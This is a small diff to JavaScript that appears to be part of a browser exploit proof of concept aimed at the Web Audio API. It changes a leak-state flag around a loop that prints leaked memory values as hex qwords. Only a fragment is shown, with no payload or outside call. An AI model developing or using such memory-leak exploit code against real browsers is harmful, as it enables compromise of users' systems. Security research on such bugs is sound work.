@@ -57,7 +57,7 @@ let source = new AudioBufferSourceNode(audioCtx);
 let myArrayBuffer = audioCtx.createBuffer(1, 128, audioCtx.sampleRate);
 await sleep(500);
             //alert();
-var is_leak = 0;
+var is_leak = 1;
 //var is_leak1 = false;
 originNode2.port.onmessage = async (e)=>{
     if(e.data == "retry"){
@@ -80,7 +80,7 @@ for(var i = 0; i < leak.length; i ++){
     print(`[${i}] : ` + floatAsQword(leak[i]).toString(16));
 }
 
-is_leak = 1;
+is_leak = 2;
 //print(e.data);
 
                 //await audioCtx.suspend(audioCtx.currentTime+ 0.01);
